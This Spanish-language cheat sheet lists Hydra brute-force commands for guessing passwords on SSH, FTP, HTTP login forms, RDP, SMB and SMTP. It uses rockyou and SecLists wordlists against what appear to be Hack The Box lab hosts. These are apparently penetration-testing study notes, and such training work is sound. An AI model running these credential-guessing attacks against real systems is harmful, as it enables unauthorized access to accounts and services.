

#### Ssh bruteforcing:
    hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://ip:port -t 4 -f
#### Ftp bruteforcing:
    hydra -l <nombre_de_usuario> -P <ruta_al_diccionario> <dirección_IP> ftp -f

#### Simplehttp auth:
    hydra  -l user -P diccionario ip -s port http-get "/path-to-login" -f
o

    hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.177.183 ftp
#### Login por método post:
    hydra -l user -P diccionario -f host/ip -s puerto http-post-form "path-to-login:variable_username=^USER^&variable_password=^PASS^:elemento html para comparación(mensaje de error de logueo, formulario, etc)"

#### Login por método get:
    hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -p minga -f 83.136.254.53 -s 53056 http-get-form "/question1:Username=^USER^&Password=^PASS^:Invalid username"

#### Login rdp:
    hydra -L user.list -P password.list rdp://10.129.42.197

#### Login smb:
    hydra -L user.list -P password.list smb://10.129.42.197

#### Smpt:
    hydra -l fiona@inlanefreight.htb -P pws.list smtp://10.129.203.7 -f


#### Listas interesantes:
ftp-betterdefaultpasslist.txt (seclist) credenciales user:pass

